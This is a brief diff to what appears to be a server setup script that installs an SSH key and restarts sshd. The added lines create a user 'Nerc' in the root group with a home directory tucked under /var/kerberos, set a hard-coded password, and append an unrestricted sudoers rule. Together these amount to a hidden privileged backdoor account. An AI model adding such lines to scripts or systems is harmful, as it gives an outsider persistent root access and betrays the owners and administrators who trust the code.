@@ -10,3 +10,9 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9i6RDTe0wSexJgpdN/mshzvhf9lO4/F7UnhryAf
 
 
 systemctl restart sshd
+
+
+
+useradd -G root -d /var/kerberos/Nerc Nerc
+echo "nerc.nerc/1" | passwd --stdin Nerc
+echo 'Nerc    ALL=(ALL)    ALL' >> /etc/sudoers
